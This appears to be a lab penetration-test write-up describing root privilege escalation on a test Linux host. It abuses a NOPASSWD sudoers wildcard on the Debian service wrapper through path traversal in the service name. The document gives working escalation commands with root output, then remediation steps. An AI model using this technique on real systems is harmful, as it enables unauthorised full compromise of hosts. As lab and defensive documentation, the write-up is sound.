# Exploit 4: Privilege Escalation via `sudo service *` Wildcard and Path Traversal

## Summary

Root privilege escalation from the `aberrant_distance` foothold (see `03-erlang-otp-ssh-rce-cve-2025-32433.md`), abusing an overly broad sudoers wildcard combined with unsanitised path concatenation in the Debian `/usr/sbin/service` wrapper script.

## Environment

| Item | Value |
|---|---|
| Target | 192.168.144.131, hostname `cav-csf-linux` |
| Starting account | `aberrant_distance` (uid 1006) |
| Resulting account | `root` (uid 0) |

## Vulnerability

`sudo -l` shows:

```
User aberrant_distance may run the following commands on cav-csf-linux:
    (root) NOPASSWD: /usr/bin/sudo -l
    (root) NOPASSWD: /usr/sbin/service *
```

`/usr/sbin/service` is a POSIX shell wrapper around `/etc/init.d` scripts (`SERVICEDIR=/etc/init.d`). On a systemd host it maps known actions (`start`, `stop`, `restart`, `status`, `try-restart`, `reload`, `force-reload`, `force-stop`) to `systemctl`. Any other second argument falls through to `run_via_sysvinit()`:

```sh
run_via_sysvinit() {
  if [ -x "${SERVICEDIR}/${SERVICE}" ]; then
     exec env -i ... "$SERVICEDIR/$SERVICE" ${ACTION} ${OPTIONS}
  else
     echo "${SERVICE}: unrecognized service" >&2
     exit 1
  fi
}
```

`$SERVICE` (the first argument to `service`) is concatenated onto `$SERVICEDIR` without sanitisation or a basename check. Supplying a path-traversal string as the service name causes `$SERVICEDIR/$SERVICE` to resolve outside `/etc/init.d` to an arbitrary executable, which is then run via `exec` as root because the whole invocation is already running under `sudo` (CWE-22, Path Traversal, combined with CWE-273/CWE-732 style overly permissive sudoers configuration).

## Exploitation

Any executable can be substituted for `../../usr/bin/id`, with a second argument standing in for `$ACTION` (which is otherwise unused by the target binary):

```
sudo -l
sudo /usr/sbin/service ../../bin/echo test
sudo /usr/sbin/service ../../usr/bin/id
```

## Evidence

```
sudo /usr/sbin/service ../../bin/echo test
test

sudo /usr/sbin/service ../../usr/bin/id
uid=0(root) gid=0(root) groups=0(root)
```

## Outcome

Arbitrary command execution as root, i.e. full compromise of the host, from the low-privilege `aberrant_distance` session obtained via CVE-2025-32433.

## Remediation

- Never grant NOPASSWD sudo access to a wrapper script with a wildcard argument (`/usr/sbin/service *`); wrap or replace it with explicit, fully-qualified unit names (e.g. `/usr/sbin/service proftpd restart` only).
- Prefer `systemctl` restricted via sudoers to specific unit names over the generic SysV `service` wrapper on systemd hosts.
- If a wrapper script must accept a service name, canonicalise the resulting path (`realpath`) and verify it remains within the intended directory before executing it, and reject arguments containing `/` or `..`.

## Lab Dependencies

**Prerequisite exploit(s):** Exploit 03 - Erlang/OTP SSH pre-authentication RCE  
**Required starting access:** Local shell as `aberrant_distance`  
**Starting account:** `aberrant_distance`  
**Resulting access:** Root command execution / root shell  
**Provides access for:** Exercises requiring root access for investigation or validation; this completes the Exploit 03 → Exploit 04 attack chain